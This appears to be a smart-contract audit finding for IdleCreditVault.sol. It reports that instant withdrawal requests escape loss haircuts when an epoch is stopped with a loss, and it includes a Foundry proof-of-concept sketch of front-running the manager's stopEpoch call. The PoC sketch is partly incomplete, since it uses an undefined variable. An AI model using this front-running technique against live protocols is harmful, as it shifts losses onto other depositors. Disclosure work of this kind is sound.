### Title
Instant withdrawal requests escape stopEpoch loss socialization and are paid at par while same-epoch normal receipts are haircut - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`requestInstantWithdraw` receipts recorded in a running epoch are never assigned a loss recovery price. When `stopEpochWithDuration(_lossAmount)` realizes a loss, normal pending withdraw receipts are haircut through `lossRecoveryPriceByEpoch` and active LPs absorb `activeLoss`, but instant receipts in the same epoch are funded and claimed at 100% via `claimInstantWithdrawRequest`. An attacker who front-runs the manager's loss-bearing `stopEpoch` call with `requestInstantWithdraw` exits at par, shifting their share of the loss onto remaining LPs and normal redeemers.

### Finding Description
In `requestInstantWithdraw` (`IdleCreditVault.sol:356-375`), the vault mints a 1:1 strategy-token receipt and records it in `instantWithdrawsRequests[_user]`, `instantWithdrawsRequestsByEpoch`, `instantWithdrawClaimsByEpoch`, and `pendingInstantWithdraws`. No loss accounting is attached to these buckets.

When a loss is realized at epoch end, `collectWithdrawFunds` stores a haircut only for the normal bucket: `lossRecoveryPriceByEpoch[epochNumber] = _amount * RECOVERY_FULL / pendingBasis` when `_amount < pendingWithdraws` (`IdleCreditVault.sol:411-421`). `previewLossAdjustedWithdrawFunds` splits `_lossAmount` only between `pendingWithdraws` and the active basis (`IdleCreditVault.sol:440-460`); `pendingInstantWithdraws` is not part of `totalBasis` and receives no `pendingLoss` share.

On the claim side, `claimInstantWithdrawRequest` (`IdleCreditVault.sol:380-393`) pays `instantWithdrawsRequests[_user]` in full through `_transferFundedClaim`. The only haircut ever applied to instant receipts is `_claimDefaultedInstantWithdrawRequest` under `defaultRecoveryFinalized && defaultInstantWithdrawsFinalized` — i.e., a borrower *default*, not an ordinary `stopEpochWithDuration` loss. There is no `lossRecoveryPriceByEpoch` check for instant receipts, so a realized loss epoch leaves them payable at par.

This mirrors the oracle bug class: a "record" (the instant receipt) registered before the privileged state change (the loss-bearing `stopEpoch`) remains valid at full value, while every other claimant in the same epoch is devalued.

### Impact Explanation
Direct loss escape / unfair payout. Concretely, with a 50% realized loss: a normal withdraw requester in that epoch claims `claimBasis * lossRecoveryPrice / RECOVERY_FULL` ≈ 50%, and active tranche holders absorb `activeLoss` through the BB-first waterfall. An instant requester who submitted `requestInstantWithdraw` in the same epoch before `stopEpoch` claims 100% of principal from funds collected via `collectInstantWithdrawFunds`/`getInstantWithdrawFunds`. The dollar difference between par and the loss-adjusted price is borne by the other LPs and pending redeemers — a quantified, protocol-realized redistribution in the attacker's favor.

### Likelihood Explanation
The attacker is an unprivileged tranche-token holder (KYC-passing lender), allowed by the rules. The trigger is mempool observation of the honest manager's `stopEpochWithDuration(..., _lossAmount)` transaction, or front-running during the window between epoch end (`block.timestamp > epochEndDate`) and the stop call. The attack requires instant withdrawals to be enabled and liquid funds available at the CDO — this gating lives in `IdleCDOEpochVariant` (I could not confirm whether `requestInstantWithdraw` is restricted to the buffer phase or gated by an `allowInstantWithdraw` flag; if instant requests are only permitted while the epoch is not running, the front-run surface shrinks to requests already queued pre-stop, which still receive the same par treatment in a loss epoch). No existing guard — the skim, the `lossRecoveryPriceByEpoch` mechanism, or epoch gating — applies a haircut to instant receipts on a non-default loss.

### Recommendation
Include `instantWithdrawClaimsByEpoch[epochNumber]` (or `pendingInstantWithdraws`) in the loss split inside `previewLossAdjustedWithdrawFunds`/`collectWithdrawFunds`, or store a per-epoch instant loss price analogous to `lossRecoveryPriceByEpoch` and apply it in `claimInstantWithdrawRequest` the same way `_claimLossAdjustedWithdrawRequest` applies `lossRecoveryPrice` to normal receipts. Alternatively, disallow/queue instant withdrawals once `epochEndDate` has passed pending the stop outcome.

### Proof of Concept
Foundry fork PoC sketch (mirroring `test/foundry/IdleCreditVault.t.sol` helpers such as `_depositWithUser`, `_startEpochAndCheckPrices`, `_stopEpochAndCheckPrices`):

```solidity
function testInstantWithdrawEscapesEpochLoss() external {
    address attacker = makeAddr('instant-attacker');
    address normalUser = makeAddr('normal-redeemer');
    uint256 amount = 10_000 * ONE_SCALE;

    // Both users hold AA tranche tokens; epoch 0 is running.
    _depositWithUser(attacker, amount, true);
    _depositWithUser(normalUser, amount, true);
    _startEpochAndCheckPrices(0);

    // Epoch ends; attacker sees manager's pending stopEpochWithDuration(loss) and front-runs.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(attacker);
    cdoEpoch.requestInstantWithdraw(attackerAmount); // recorded in current epoch, no loss tag
    vm.prank(normalUser);
    cdoEpoch.requestWithdraw(0, address(AAtranche)); // normal receipt, same epoch

    // Honest manager stops the epoch with a 50% realized loss; borrower funds the haircut amount.
    uint256 pendingBasis = strategy.pendingWithdraws();
    uint256 activeBasis = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest();
    uint256 lossAmount = (activeBasis + pendingBasis) / 2;
    (uint256 pendingToFund,) = strategy.previewLossAdjustedWithdrawFunds(lossAmount);
    deal(defaultUnderlying, borrower, cdoEpoch.expectedEpochInterest() + pendingToFund);
    vm.prank(borrower);
    IERC20Detailed(defaultUnderlying).approve(address(cdoEpoch), type(uint256).max);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(initialProvidedApr, 0, cdoEpoch.epochDuration(), lossAmount);

    // Normal user is haircut via lossRecoveryPriceByEpoch.
    uint256 normalPre = underlying.balanceOf(normalUser);
    vm.prank(normalUser);
    cdoEpoch.claimWithdrawRequest();
    uint256 normalPaid = underlying.balanceOf(normalUser) - normalPre;
    assertLt(normalPaid, pendingBasis); // < 100%

    // Attacker claims the instant receipt at par — no loss price applied.
    uint256 atkPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimInstantWithdrawRequest();
    assertEq(underlying.balanceOf(attacker) - atkPre, attackerAmount); // 100%, loss escaped
}
```

Expected result: `attacker` receives full principal while `normalUser` and remaining LPs absorb the entire loss, demonstrating the broken loss-waterfall invariant. Uncertainty noted above: if `IdleCDOEpochVariant.requestInstantWithdraw` is phase-gated to the buffer period, the same asymmetry still applies to instant requests queued before the loss stop, but the front-run must be timed accordingly — a Devin session should confirm that gating before finalizing severity.